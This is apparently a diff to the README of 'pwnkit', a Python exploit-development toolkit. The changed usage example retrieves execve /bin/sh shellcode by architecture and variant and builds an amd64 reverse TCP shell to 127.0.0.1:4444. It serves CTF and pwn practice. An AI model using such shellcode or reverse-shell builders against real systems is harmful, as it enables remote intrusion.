@@ -203,14 +203,37 @@ dec_fd = slfd.decrypt(enc_fd)
 assert fd == dec_fd
 
 # - Shellcode generation
-# 1) Retrieve from ShellcodeStore
-sc_binsh = SHELLCODESTORE.get("amd64", "execve_bin_sh").blob
-# 2) Build an ascii-only decoder stub for amd64 using RAX seed
+# 1) List all built-in available shellcodes
+for name in list_shellcodes():
+    print(" -", name)
+
+# 2) Retrieve by arch + name, default variant (min)
+sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
+print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
+print(hex_shellcode(sc.blob))   # output as hex
+
+# 3) Retrieve explicit variant
+sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
+print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
+print(hex_shellcode(sc.blob))
+
+# 4) Retrieve via composite key
+sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
+print(f"[+] Got shellcode: {sc.name}")
+print(hex_shellcode(sc.blob))
+
+# 5) Fuzzy lookup
+sc = ShellcodeReigstry.get("amd64", "ls_")
+print(f"[+] Fuzzy match: {sc.name}")
+print(hex_shellcode(sc.blob))
+
+# 6) Builder demo: reverse TCP shell (amd64)
 builder = ShellcodeBuilder("amd64")
-stub = builder.build_alpha_shellcode("rax")
-# 3) Build reverse TCP connect/shell blobs
-sc_revconn = builder.build_reverse_tcp_connect("127.0.0.1", 4444)
-sc_revsh   = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
+rev = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
+print(f"[+] Built reverse TCP shell ({len(rev)} bytes)")
+print(hex_shellcode(rev))
+
+
 
 ...
 
@@ -267,6 +290,9 @@ pwnkit exploit.py -t mytpl
 ```
 For devs, you can also place your exploit templates (which is just a Python file of filename ending with `tpl` suffix) into [`src/pwnkit/templates`](https://github.com/4xura/pwnkit/tree/main/src/pwnkit/templates), before cloning and building to make a built-in. You are also welcome to submit a custom template there in this repo for a pull request!
 
+---
 
+## TODO
 
-
+* Move the template feature under mode `template`
+* Create other modes (when needed)
